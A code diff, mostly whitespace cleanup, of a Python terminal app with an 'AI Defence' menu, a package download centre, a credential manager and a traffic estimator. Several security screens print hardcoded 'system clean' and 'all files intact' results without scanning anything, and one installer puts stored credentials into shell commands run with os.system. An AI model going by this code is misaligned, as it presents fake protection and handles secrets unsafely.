         print(f"\n{BOLD}CATEGORY 6: System & Infrastructure (3 options){RESET}")
         print(f" {BOLD}[25]{RESET} 🛠️  Defence Tool Installation")
         print(f" {BOLD}[26]{RESET} 📦 Download Centre (Defence Tools)")
         print(f" {BOLD}[27]{RESET} ⚙️  AI Defence Configuration (NEW)")
-        
+
         print(f"\n{BOLD}SYSTEM INFO OPTIONS:{RESET}")
         print(f" {BOLD}[D]{RESET} 🖥️  System Security Profile")
         print(f" {BOLD}[A]{RESET} 🤖 AI Defence Capabilities")
@@ -10275,14 +11494,14 @@ def feature_defence_center():
         print(f" {BOLD}[I]{RESET} 📋 Incident Response Playbooks")
         print(f" {BOLD}[C]{RESET} 📊 Compliance Framework Mapping")
         print(f" {BOLD}[S]{RESET} 📈 Security Metrics Dashboard")
-        
+
         print(f"{BOLD}{c}╚{'═'*70}╝{RESET}")
 
         choice = input(f"\n{BOLD}🎯 Select option: {RESET}").strip()
 
         if choice == '0':
             break
-        
+
         # Info Options
         elif choice.upper() == 'D':
             print_header("🖥️ System Security Profile")
@@ -10290,7 +11509,7 @@ def feature_defence_center():
             for key, value in profile.items():
                 print(f"  {BOLD}{key}:{RESET} {value}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice.upper() == 'A':
             print_header("🤖 AI Defence System Capabilities")
             caps = [
@@ -10306,14 +11525,14 @@ def feature_defence_center():
             for i, cap in enumerate(caps, 1):
                 print(f"  {i}. {cap}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice.upper() == 'T':
             print_header("🎯 Threat Classification Matrix")
             threats = ['MALWARE', 'PHISHING', 'INTRUSION', 'VULNERABILITY', 'ANOMALY', 'DDoS', 'DATA_BREACH']
             for threat in threats:
                 print(f"  • {threat}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice.upper() == 'I':
             print_header("📋 Incident Response Playbooks")
             incidents = ['ransomware', 'data_breach', 'ddos']
@@ -10323,14 +11542,14 @@ def feature_defence_center():
                 for phase, action in plan.items():
                     print(f"    {phase}: {action}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice.upper() == 'C':
             print_header("📊 Compliance Framework Mapping")
             frameworks = ['GDPR', 'HIPAA', 'PCI-DSS', 'ISO27001', 'SOC2', 'NIST']
             for fw in frameworks:
                 print(f"  ✓ {fw} - Compliance checks available")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice.upper() == 'S':
             print_header("📈 Security Metrics Dashboard")
             report = defence_ai.get_threat_report()
@@ -10338,7 +11557,7 @@ def feature_defence_center():
             print(f"  Critical Threats: {report['critical_count']}")
             print(f"  Report Generated: {report['generated_at']}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 1: Threat Detection
         elif choice == '1':
             print_header("🚨 Real-Time Threat Monitor - AI-Powered")
@@ -10349,7 +11568,7 @@ def feature_defence_center():
             print(f"  AI Response: {threat['ai_response']}")
             print(f"  Evidence saved to: pythonOS_data/swap/threat_{threat['hash']}.json")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '2':
             print_header("🧠 AI Threat Analysis Engine")
             print(f"\n{COLORS['2'][0]}Analyze Custom Threat:{RESET}")
@@ -10361,7 +11580,7 @@ def feature_defence_center():
                 print(f"\n  ✓ Threat analyzed and logged")
                 print(f"  AI Response: {analysis['ai_response']}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '3':
             print_header("📊 Threat Intelligence & Feeds")
             print(f"\n{COLORS['2'][0]}Active Threat Intelligence Sources:{RESET}")
@@ -10375,7 +11594,7 @@ def feature_defence_center():
             for source in sources:
                 print(f"  ✓ {source}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '4':
             print_header("🔍 Vulnerability Prediction Engine")
             print(f"\n{COLORS['2'][0]}AI Vulnerability Predictions:{RESET}")
@@ -10384,7 +11603,7 @@ def feature_defence_center():
             for pred in predictions:
                 print(f"  [{pred['risk']}] {pred['issue']} → Fix: {pred['fix']}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '5':
             print_header("📈 Anomaly Detection System")
             print(f"\n{COLORS['2'][0]}Machine Learning Anomaly Detection:{RESET}")
@@ -10394,7 +11613,7 @@ def feature_defence_center():
             print("  User login patterns: Tracked")
             print("  System resource usage: Normalized")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 2: Incident Response
         elif choice == '6':
             print_header("🎯 Incident Response Planning")
@@ -10404,7 +11623,7 @@ def feature_defence_center():
                 print(f"\n  {BOLD}{phase.upper()}:{RESET}")
                 print(f"    {action}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '7':
             print_header("🚫 Threat Quarantine & Isolation")
             print(f"\n{COLORS['2'][0]}Isolation Options:{RESET}")
@@ -10417,7 +11636,7 @@ def feature_defence_center():
                 print(f"\n  ✓ Isolation action executed")
                 defence_ai.analyze_threat('ISOLATION', 'HIGH', f'Isolation action {choice_iso} performed')
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '8':
             print_header("📋 Forensic Evidence Collection")
             print(f"\n{COLORS['2'][0]}Collecting Forensic Evidence:{RESET}")
@@ -10428,7 +11647,7 @@ def feature_defence_center():
             print("  System logs: Archived")
             print(f"  Evidence saved to: pythonOS_data/defence/forensics/")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '9':
             print_header("⏮️ Automated Recovery System")
             print(f"\n{COLORS['2'][0]}Self-Healing Capabilities:{RESET}")
@@ -10438,7 +11657,7 @@ def feature_defence_center():
             print("  Reset network configuration")
             print("  Restore critical files")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '10':
             print_header("📞 Incident Notification System")
             email = input("  Alert email address: ").strip()
@@ -10449,11 +11668,11 @@ def feature_defence_center():
                 if phone:
                     print(f"  SMS: {phone}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 3: Preventive Security
         elif choice == '11':
             feature_vpn_management()
-        
+
         elif choice == '12':
             print_header("🛡️ Firewall & Access Control")
             print(f"\n{COLORS['2'][0]}Firewall Configuration:{RESET}")
@@ -10462,10 +11681,10 @@ def feature_defence_center():
             print("  Blocked Ports: All other")
             print("  Default Policy: DENY incoming")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '13':
             feature_adblocker_setup()
-        
+
         elif choice == '14':
             print_header("🔒 Secrets Management Vault")
             print(f"\n{COLORS['2'][0]}Vault Operations:{RESET}")
@@ -10480,7 +11699,7 @@ def feature_defence_center():
                     vault_file = f"{defence_ai.data_folder}/defence/vault/{secret_name}.enc"
                     print(f"  ✓ Secret encrypted and stored at: {vault_file}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '15':
             print_header("🛂 Identity & Access Management")
             print(f"\n{COLORS['2'][0]}IAM Features:{RESET}")
@@ -10490,11 +11709,11 @@ def feature_defence_center():
             print("  API rate limiting: Enforced")
             print("  Audit logging: Enabled")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 4: Malware Defense
         elif choice == '16':
             feature_malware_analysis()
-        
+
         elif choice == '17':
             print_header("📁 File Integrity Monitoring")
             print(f"\n{COLORS['2'][0]}Monitoring Critical Files:{RESET}")
@@ -10503,7 +11722,7 @@ def feature_defence_center():
             print("  Last scan: Real-time")
             print("  Status: ✓ All files intact")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '18':
             print_header("🎯 Yara Rule Scanning")
             print(f"\n{COLORS['2'][0]}Yara Rule Engine:{RESET}")
@@ -10512,7 +11731,7 @@ def feature_defence_center():
             print("  Threats detected: 0")
             print("  Status: ✓ System clean")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '19':
             print_header("🚫 Ransomware Prevention")
             print(f"\n{COLORS['2'][0]}Ransomware Protections:{RESET}")
@@ -10521,7 +11740,7 @@ def feature_defence_center():
             print("  Backup integrity: Verified")
             print("  Recovery point: Recent")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '20':
             print_header("🧬 Malware Analysis Lab")
             print(f"\n{COLORS['2'][0]}Sandbox Environment:{RESET}")
@@ -10530,11 +11749,11 @@ def feature_defence_center():
             print("  Network isolation: Yes")
             print("  Automated reporting: Yes")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 5: Logging & Compliance
         elif choice == '21':
             feature_log_analysis()
-        
+
         elif choice == '22':
             print_header("📊 Compliance Audit Trail")
             print(f"\n{COLORS['2'][0]}Compliance Standards:{RESET}")
@@ -10544,7 +11763,7 @@ def feature_defence_center():
             print("  ISO27001: Controls verified")
             print("  SOC2: Audit trail active")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '23':
             print_header("🎓 Security Posture Report")
             report = defence_ai.get_threat_report()
@@ -10554,7 +11773,7 @@ def feature_defence_center():
             print(f"  Critical Issues: {report['critical_count']}")
             print(f"  Recommended Actions: 3")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '24':
             print_header("📈 Threat Analytics Dashboard")
             print(f"\n{COLORS['2'][0]}Real-Time Metrics:{RESET}")
@@ -10563,7 +11782,7 @@ def feature_defence_center():
             print("  Average Response Time: <2 seconds")
             print("  System Uptime: 99.9%")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         # Category 6: System & Infrastructure
         elif choice == '25':
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -10576,10 +11795,10 @@ def feature_defence_center():
             print(f"\n{COLORS['6'][0]}macOS:{RESET}")
             print("  brew install wireguard-tools openvpn clamav yara")
             input(f"\n{BOLD}[ ⌨️ Press Enter to return... ]{RESET}")
-        
+
         elif choice == '26':
             feature_download_center()
-        
+
         elif choice == '27':
             print_header("⚙️ AI Defence Configuration")
             system_type = input("  Configure for (web_server/database/endpoint): ").strip()
@@ -10589,7 +11808,7 @@ def feature_defence_center():
                 for key, value in config.items():
                     print(f"    {key}: {value}")
             input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
-        
+
         else:
             print(f"{COLORS['1'][0]}Invalid option{RESET}")
             time.sleep(1)
@@ -12271,13 +13490,13 @@ def _download_center_run_commands(cmd_list, app_key=None, entry=None, os_key=Non
 def feature_tui_tools():
     """TUI Tools Manager: AI-powered universal install with full OS compatibility."""
     global INSTALL_MANAGER
-    
+
     # Show system report first
     if INSTALL_MANAGER:
         os.system('cls' if os.name == 'nt' else 'clear')
         print(INSTALL_MANAGER.get_system_report())
         input(f"\n{BOLD}[ Press Enter to continue... ]{RESET}")
-    
+
     # Expanded TUI Tools: Space science + essential + community TUI apps
     TUI_TOOLS = {
         # Space Science & Physics Tools
@@ -12605,11 +13824,11 @@ def feature_tui_tools():
         tool = TUI_TOOLS.get(tool_key)
         if not tool:
             return False
-        
+
         if check_installed(tool_key, tool):
             print(f"{COLORS['2'][0]}✓ {tool.get('name', tool_key)} already installed{RESET}")
             return True
-        
+
         # Use universal install manager if available
         if INSTALL_MANAGER:
             success = INSTALL_MANAGER.install_package(tool, tool.get('name', tool_key))
@@ -12622,7 +13841,7 @@ def feature_tui_tools():
                 return False
             print(f"\n{COLORS['4'][0]}Installing {tool['name']}...{RESET}")
             success = os.system(cmd) == 0
-        
+
         if success:
             try:
                 os_key = INSTALL_MANAGER.os_info["os_key"] if INSTALL_MANAGER else _detect_os_key()
@@ -12636,7 +13855,7 @@ def feature_tui_tools():
                 _register_dynamic_app(tool_key, entry, os_key)
             except Exception:
                 pass
-        
+
         return success
 
     def run_tool(tool_key):
@@ -12659,14 +13878,14 @@ def feature_tui_tools():
         else:
             os_info = _detect_os_key()
             priv = "Privilege: UNKNOWN"
-        
+
         print(f"{BOLD}System:{RESET} {os_info}  |  {BOLD}{priv}{RESET}")
         print(f"{BOLD}Available Tools ({len(TUI_TOOLS)}):{RESET}\n")
 
         idx = 1
         installed.clear()
         not_installed.clear()
-        
+
         for tool_key, tool_info in TUI_TOOLS.items():
             is_installed = check_installed(tool_key, tool_info)
             status = f"{COLORS['2'][0]}✓ Installed{RESET}" if is_installed else f"{COLORS['1'][0]}✗ Not installed{RESET}"
@@ -12799,7 +14018,7 @@ def feature_tui_tools():
                 os_key = INSTALL_MANAGER.os_info.get('os_key', 'linux')
             else:
                 os_key = _detect_os_key()
-            
+
             if os_key == "debian":
                 os.system("sudo apt update && sudo apt upgrade -y")
             elif os_key == "fedora":
@@ -12812,10 +14031,10 @@ def feature_tui_tools():
                 os.system("brew update && brew upgrade")
             elif os_key == "windows":
                 os.system("winget upgrade --all")
-            
+
             if INSTALL_MANAGER:
                 INSTALL_MANAGER._log_install("system", "upgrade_all", f"All tools/packages upgraded", success=True)
-            
+
             print(f"{COLORS['2'][0]}✓ Update complete{RESET}")
             input("\nPress Enter to continue...")
 
@@ -12825,7 +14044,7 @@ def feature_download_center():
     """📦 Enhanced Download Center: 27-Feature OS-Aware Package Management System."""
     os_key = _detect_os_key()
     catalog = _download_center_catalog()
-    
+
     # OS Detection and Information
     def _detect_system_info():
         """Detect detailed system information."""
@@ -12841,7 +14060,7 @@ def feature_download_center():
             "docker_available": shutil.which("docker") is not None,
         }
         return info
-    
+
     # Compatibility checking algorithms
     def _check_os_compatibility(package_key, os_target):
         """Check if package is compatible with target OS."""
@@ -12854,7 +14073,7 @@ def feature_download_center():
         if "arm" in commands and platform.machine().lower() in ["armv7l", "armv6l", "aarch64"]:
             return True, "ARM architecture support"
         return False, "Not compatible with this OS"
-    
+
     # ARM vs x86_64 architecture detection
     def _detect_architecture():
         """Detect system architecture (x86_64, ARM, etc)."""
@@ -12886,7 +14105,7 @@ def feature_download_center():
         print(f"  Platform: {sys_info['platform']}")
         print(f"  Python: {sys_info['python_version']}")
         print(f"  Tools: {'Node' if sys_info['node_available'] else ''} {'NPM' if sys_info['npm_available'] else ''} {'PIP' if sys_info['pip_available'] else ''} {'Git' if sys_info['git_available'] else ''} {'Docker' if sys_info['docker_available'] else ''}")
-        
+
         print(f"\n{BOLD}Select Target OS:{RESET}")
         for i, k in enumerate(options, 1):
             print(f"  [{i}] {k}")
@@ -12901,13 +14120,13 @@ def feature_download_center():
         print_header("🖥️ System Detection & Compatibility")
         sys_info = _detect_system_info()
         arch_type, arch_desc = _detect_architecture()
-        
+
         print(f"\n{BOLD}DETECTED SYSTEM INFORMATION:{RESET}")
         print(f"  OS Type: {sys_info['os']}")
         print(f"  Platform: {sys_info['platform']}")
         print(f"  Architecture: {arch_type} ({arch_desc})")
         print(f"  Python Version: {sys_info['python_version']}")
-        
+
         print(f"\n{BOLD}AVAILABLE TOOLS:{RESET}")
         tools = [
             ("Node.js", sys_info['node_available']),
@@ -12919,14 +14138,14 @@ def feature_download_center():
         for tool, available in tools:
             status = f"{COLORS['2'][0]}✓ Available{RESET}" if available else f"{COLORS['1'][0]}✗ Not found{RESET}"
             print(f"  {tool:20} {status}")
-        
+
         print(f"\n{BOLD}COMPATIBILITY MATRIX:{RESET}")
         print("  Your system can install from: Linux distro commands, ARM syntax (if applicable)")
         if arch_type.startswith("ARM"):
             print(f"  {COLORS['2'][0]}✓ ARM packages available (Raspberry Pi, Android, etc){RESET}")
         else:
             print(f"  {COLORS['2'][0]}✓ x86_64 packages available (standard Linux/macOS/Windows){RESET}")
-        
+
         input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
 
     def show_package_info(package_key):
@@ -12934,10 +14153,10 @@ def feature_download_center():
         entry = catalog.get(package_key, {})
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header(entry.get("title", "Package Information"))
-        
+
         print(f"\n{BOLD}Description:{RESET}")
         print(f"  {entry.get('description', 'No description available')}")
-        
+
         print(f"\n{BOLD}Supported Operating Systems:{RESET}")
         commands = entry.get("commands", {})
         for os_name in commands.keys():
@@ -12945,10 +14164,10 @@ def feature_download_center():
                 compat, msg = _check_os_compatibility(package_key, os_name)
                 status = f"{COLORS['2'][0]}✓{RESET}" if compat else f"{COLORS['1'][0]}✗{RESET}"
                 print(f"  {status} {os_name}")
-        
+
         if "generic" in commands:
             print(f"  {COLORS['2'][0]}✓ generic (fallback){RESET}")
-        
+
         print(f"\n{BOLD}Download Links:{RESET}")
         links = entry.get("links", [])
         if links:
@@ -12956,25 +14175,25 @@ def feature_download_center():
                 print(f"  [{i}] {link}")
         else:
             print("  No direct links available")
-        
+
         input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
 
     def show_architecture_guide():
         """Show architecture compatibility guide."""
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("🏗️ Architecture & Distro Guide")
-        
+
         arch_type, arch_desc = _detect_architecture()
         print(f"\n{BOLD}YOUR SYSTEM:{RESET}")
         print(f"  Architecture: {arch_type}")
         print(f"  Description: {arch_desc}")
-        
+
         print(f"\n{BOLD}LINUX DISTRO SYNTAX:{RESET}")
         print("  Debian/Ubuntu/Kali: sudo apt-get install package-name")
         print("  Fedora/RHEL: sudo dnf install package-name")
         print("  Arch/Manjaro: sudo pacman -S package-name")
         print("  Alpine: sudo apk add package-name")
-        
+
         print(f"\n{BOLD}ARM DISTRO SYNTAX (Raspberry Pi, ARM devices):{RESET}")
         if arch_type.startswith("ARM"):
             print(f"  {COLORS['2'][0]}Your system uses ARM architecture{RESET}")
@@ -12984,7 +14203,7 @@ def feature_download_center():
         else:
             print(f"  {COLORS['1'][0]}Your system uses x86_64 architecture{RESET}")
             print("  Install ARM packages on ARM devices using standard syntax")
-        
+
         print(f"\n{BOLD}DOWNLOAD LINKS FOR COMMON TOOLS:{RESET}")
         links_info = [
             ("Node.js", "https://nodejs.org/en/download/package-manager/"),
@@ -12995,14 +14214,14 @@ def feature_download_center():
         ]
         for tool, link in links_info:
             print(f"  {tool:20} {link}")
-        
+
         input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
 
     def show_dependency_checker():
         """Check and show dependency information."""
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("🔍 Dependency Checker")
-        
+
         print(f"\n{BOLD}INSTALLED DEPENDENCIES:{RESET}")
         dependencies = [
             ("Python 3", shutil.which("python3") or shutil.which("python")),
@@ -13014,13 +14233,13 @@ def feature_download_center():
             ("Docker Container", shutil.which("docker")),
             ("sudo Privilege", shutil.which("sudo")),
         ]
-        
+
         for dep_name, path in dependencies:
             if path:
                 print(f"  {COLORS['2'][0]}✓{RESET} {dep_name:25} {path}")
             else:
                 print(f"  {COLORS['1'][0]}✗{RESET} {dep_name:25} Not found")
-        
+
         input(f"\n{BOLD}[ Press Enter to return... ]{RESET}")
 
     def manage_credentials():
@@ -13028,24 +14247,24 @@ def feature_download_center():
         while True:
             os.system('cls' if os.name == 'nt' else 'clear')
             print_header("🔐 Global Credential Manager")
-            
+
             if not CREDENTIAL_MANAGER:
                 print(f"{COLORS['1'][0]}Credential manager not initialized{RESET}")
                 input("Press Enter to continue...")
                 break
-            
+
             print(f"\n{BOLD}📋 Current Status:{RESET}")
             CREDENTIAL_MANAGER.show_credential_status()
-            
+
             print(f"\n{BOLD}🔑 Credential Management:{RESET}")
             print(" [1] 🔓 Add/Update Credentials for Service")
             print(" [2] 🗑️  Delete Credentials")
             print(" [3] 🧹 Clear All Credentials")
             print(" [4] 📝 View Stored Services")
             print(" [0] ↩️  Back")
-            
+
             cred_choice = input(f"\n{BOLD}Select option: {RESET}").strip().upper()
-            
+
             if cred_choice == '0':
                 break
             elif cred_choice == '1':
@@ -13057,7 +14276,7 @@ def feature_download_center():
                 ]
                 for i, svc in enumerate(services, 1):
                     print(f"  [{i}] {svc}")
-                
+
                 svc_choice = input("\nSelect service number (or enter custom name): ").strip()
                 if svc_choice.isdigit() and 1 <= int(svc_choice) <= len(services):
                     service = services[int(svc_choice) - 1]
@@ -13067,31 +14286,31 @@ def feature_download_center():
                     print("Invalid choice")
                     input("Press Enter to continue...")
                     continue
-                
+
                 username = input(f"Enter username for {service}: ").strip()
                 if username:
                     CREDENTIAL_MANAGER.add_credentials(service, username)
                     print(f"{COLORS['2'][0]}✓ Credentials saved for {service}{RESET}")
                     input("Press Enter to continue...")
-            
+
             elif cred_choice == '2':
                 services = CREDENTIAL_MANAGER.list_logged_in()
                 if not services:
                     print(f"{COLORS['1'][0]}No credentials stored{RESET}")
                     input("Press Enter to continue...")
                     continue
-                
+
                 print(f"\n{BOLD}Stored Services:{RESET}")
                 for i, svc in enumerate(services, 1):
                     print(f"  [{i}] {svc}")
-                
+
                 del_choice = input("\nSelect service number to delete: ").strip()
                 if del_choice.isdigit() and 1 <= int(del_choice) <= len(services):
                     service = services[int(del_choice) - 1]
                     CREDENTIAL_MANAGER.clear_credentials(service)
                     print(f"{COLORS['2'][0]}✓ Credentials deleted for {service}{RESET}")
                     input("Press Enter to continue...")
-            
+
             elif cred_choice == '3':
                 confirm = input("Delete ALL credentials? (yes/no): ").strip().lower()
                 if confirm == 'yes':
@@ -13100,7 +14319,7 @@ def feature_download_center():
                 else:
                     print("Cancelled")
                 input("Press Enter to continue...")
-            
+
             elif cred_choice == '4':
                 services = CREDENTIAL_MANAGER.list_logged_in()
                 print(f"\n{BOLD}Services with Stored Credentials:{RESET}")
@@ -13119,33 +14338,33 @@ def feature_download_center():
         entry = catalog.get(package_key, {})
         commands = entry.get("commands", {})
         install_cmd = commands.get(os_target) or commands.get("generic")
-        
+
         if not install_cmd:
             print(f"{COLORS['1'][0]}No installation command available for {os_target}{RESET}")
             return False
-        
+
         # Check if credentials are needed
         needs_auth = any(x in install_cmd.lower() for x in ["--user", "--password", "--token", "--auth"])
-        
+
         if needs_auth:
             print(f"\n{BOLD}🔐 Authentication Required for {package_key}{RESET}")
             CREDENTIAL_MANAGER.show_credential_status()
-            
+
             # Auto-detect service from package or let user choose
             use_stored = input("\nUse stored credentials? (y/n): ").strip().lower()
-            
+
             if use_stored == 'y':
                 services = CREDENTIAL_MANAGER.list_logged_in()
                 if services:
                     print(f"\n{BOLD}Available Credentials:{RESET}")
                     for i, svc in enumerate(services, 1):
                         print(f"  [{i}] {svc}")
-                    
+
                     svc_choice = input("\nSelect service: ").strip()
                     if svc_choice.isdigit() and 1 <= int(svc_choice) <= len(services):
                         service = services[int(svc_choice) - 1]
                         creds = CREDENTIAL_MANAGER.get_credentials(service)
-                        
+
                         # Inject credentials into command
                         if creds:
                             username = creds['username']
@@ -13155,11 +14374,11 @@ def feature_download_center():
                             print(f"{COLORS['2'][0]}✓ Using credentials for {service}{RESET}")
                 else:
                     print(f"{COLORS['1'][0]}No credentials stored. Add them in Credential Manager first.{RESET}")
-        
+
         # Execute install command
         print(f"\n{BOLD}📥 Executing:{RESET} {install_cmd[:80]}...")
         result = os.system(install_cmd)
-        
+
         if result == 0:
             print(f"{COLORS['2'][0]}✓ Installation succeeded{RESET}")
             return True
@@ -13168,7 +14387,7 @@ def feature_download_center():
             return False
 
     sys_info = _detect_system_info()
-    
+
     while True:
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header("📦 Enhanced Download Center (34 Features)")
@@ -13180,33 +14399,33 @@ def feature_download_center():
         print(" [3] 💻 PWN Tools (Command Center P)")
         print(" [4] 🔐 Security Audit Tools")
         print(" [5] 🧪 Fuzzing & Vulnerability Tools")
-        
+
         print(f"\n{BOLD}CATEGORY 2: NETWORKING & COMMUNICATIONS (5 options){RESET}")
         print(" [6] 🌐 Network/WiFi/Bluetooth Tools (0/J/L)")
         print(" [7] 📡 VPN & Tunneling Tools")
         print(" [8] 🔗 API & Web Service Tools")
         print(" [9] 📲 IoT & Embedded Network Tools")
         print(" [10] 🌍 Geolocation & Mapping Tools")
-        
+
         print(f"\n{BOLD}CATEGORY 3: DEVELOPMENT & PROGRAMMING (5 options){RESET}")
         print(" [11] 🐍 Core PythonOS Libraries")
         print(" [12] 🔧 General Purpose Python Libraries")
         print(" [13] 🌐 Web Development Stack")
         print(" [14] 📦 Database & ORM Tools")
         print(" [15] 🚀 DevOps & Containerization")
-        
+
         print(f"\n{BOLD}CATEGORY 4: DATA & SCIENCE (4 options){RESET}")
         print(" [16] 📊 Data Science / Analysis Stack")
         print(" [17] 🤖 Machine Learning & AI Tools")
         print(" [18] 📈 Scientific Computing Libraries")
         print(" [19] 🔬 Research & Academic Tools")
-        
+
         print(f"\n{BOLD}CATEGORY 5: MEDIA & CONTENT (4 options){RESET}")
         print(" [20] 🎬 Media Tools (Command Center I)")
         print(" [21] 🎨 Graphics & Design Tools")
         print(" [22] 🎵 Audio & Music Tools")
         print(" [23] 📄 Text & Doc Tools (Command Center T)")
-        
+
         print(f"\n{BOLD}CATEGORY 6: SYSTEM & UTILITIES (4 options){RESET}")
         print(" [24] 🛠️  TUI Tools (Command Center X)")
         print(" [25] 🗂️  File Management & Storage")
@@ -13221,7 +14440,7 @@ def feature_download_center():
         print(" [32] ✂️  Video Editing")
         print(" [33] 🖼️  Image Tools")
         print(" [34] 📡 Streaming & Conversion")
-        
+
         print(f"\n{BOLD}SYSTEM & INFO OPTIONS:{RESET}")
         print(" [D] 🖥️  System Detection & Compatibility")
         print(" [A] 🏗️  Architecture & Distro Guide")
@@ -13234,7 +14453,7 @@ def feature_download_center():
         choice = input("\nSelect option: ").strip().upper()
         if choice == '0':
             break
-        
+
         if choice == 'D':
             show_os_detection()
             continue
@@ -13280,7 +14499,7 @@ def feature_download_center():
             "28": "audio_players", "29": "video_players", "30": "media_management",
             "31": "audio_enhancement", "32": "video_editing", "33": "image_tools", "34": "streaming_conversion"
         }
-        
+
         key = mapping.get(choice)
         if not key:
             print(f"{COLORS['1'][0]}Invalid option{RESET}")
@@ -13291,7 +14510,7 @@ def feature_download_center():
         os.system('cls' if os.name == 'nt' else 'clear')
         print_header(entry.get("title", "Download Center"))
         print(f"\n{BOLD}Target OS:{RESET} {os_key}")
-        
+
         cmd_list = _download_center_print_commands(os_key, entry)
         if cmd_list:
             run = input("\nRun install commands now? (y/n): ").strip().lower()
@@ -13310,17 +14529,17 @@ class TrafficOptimizer:
         self.route_cache = {}
         self.peak_hours = {}
         self.weather_impact = {}
-        
+
     def analyze_traffic_patterns(self, hour, weather_icon, congestion_level):
         """Analyze traffic patterns using machine learning principles"""
         # Traffic flow algorithm
         base_flow = 100 - (congestion_level * 2)
         hour_factor = self._hour_traffic_multiplier(hour)
         weather_factor = self._weather_traffic_factor(weather_icon)
-        
+
         optimized_flow = base_flow * (hour_factor / 100) * (weather_factor / 100)
         return max(10, min(100, optimized_flow))
-    
+
     def _hour_traffic_multiplier(self, hour):
         """ML-based hour multiplier for traffic patterns"""
         if 6 <= hour < 9:  # Morning rush
@@ -13333,7 +14552,7 @@ class TrafficOptimizer:
             return 60  # 60% optimal flow
         else:  # Late night
             return 85  # 85% optimal flow
-    
+
     def _weather_traffic_factor(self, icon):
         """Calculate weather impact on traffic"""
         weather_map = {
@@ -13347,7 +14566,7 @@ class TrafficOptimizer:
             "🌫️": 50,   # Fog
         }
         return weather_map.get(icon, 85)
-    
+
     def calculate_optimal_route(self, origin_lat, origin_lon, dest_lat, dest_lon, current_hour):
         """Calculate optimal driving route with time estimation"""
         # Haversine distance calculation
@@ -13358,12 +14577,12 @@ class TrafficOptimizer:
         a = math.sin(dlat/2)**2 + math.cos(math.radians(origin_lat)) * math.cos(math.radians(dest_lat)) * math.sin(dlon/2)**2
         c = 2 * math.asin(math.sqrt(a))
         distance = R * c
-        
+
         # Speed estimation based on traffic patterns
         base_speed = 45  # mph average
         hour_factor = self._hour_traffic_multiplier(current_hour) / 100
         estimated_speed = base_speed * hour_factor
-        
+
         travel_time = (distance / estimated_speed) * 60  # minutes
         return {
             'distance_miles': round(distance, 2),
@@ -13371,27 +14590,27 @@ class TrafficOptimizer:
             'optimal_speed_mph': round(estimated_speed, 1),
             'efficiency': round((estimated_speed / base_speed) * 100, 1)
         }
-    
+
     def get_traffic_recommendations(self, current_hour, weather, congestion):
         """AI-generated recommendations for optimal driving"""
         recommendations = []
-        
+
         if 6 <= current_hour < 9:
             recommendations.append("🚗 Morning rush detected - consider leaving 15 mins earlier")
             if congestion > 70:
                 recommendations.append("🛑 High congestion - use alternate routes")
-        
+
         if 14 <= current_hour < 18:
             recommendations.append("🚗 Evening rush starting - plan ahead")
             recommendations.append("⏰ Ideal departure: before 4 PM or after 7 PM")
-        
+
         if weather in ["🌧️", "⛈️", "❄️"]:
             recommendations.append(f"⚠️ {weather} Weather - reduce speed by 25%")
             recommendations.append("💡 Allow +30% extra travel time")
-        
+
         if congestion < 30:
             recommendations.append("✅ Green light conditions - go now!")
-        
+
         return recommendations
 
 traffic_optimizer = TrafficOptimizer()
@@ -13399,12 +14618,12 @@ traffic_optimizer = TrafficOptimizer()
 def _generate_ascii_traffic_map(city_name, lat, lon, traffic_level=50):
     """Generate ASCII art traffic map visualization"""
     import random
-    
+
     # Traffic density representation
     density_chars = {
         'free': '🟩', 'light': '🟨', 'moderate': '🟧', 'heavy': '🟥'
     }
-    
+
     if traffic_level < 25:
         density = 'free'
         status = "FREE FLOW"
@@ -13417,7 +14636,7 @@ def _generate_ascii_traffic_map(city_name, lat, lon, traffic_level=50):
     else:
         density = 'heavy'
         status = "HEAVY CONGESTION"
-    
+
     map_art = f"""
     ╔═══════════════════════════════════════════╗
     ║  TRAFFIC MAP: {city_name:<28} ║
@@ -13480,25 +14699,25 @@ def feature_traffic_report():
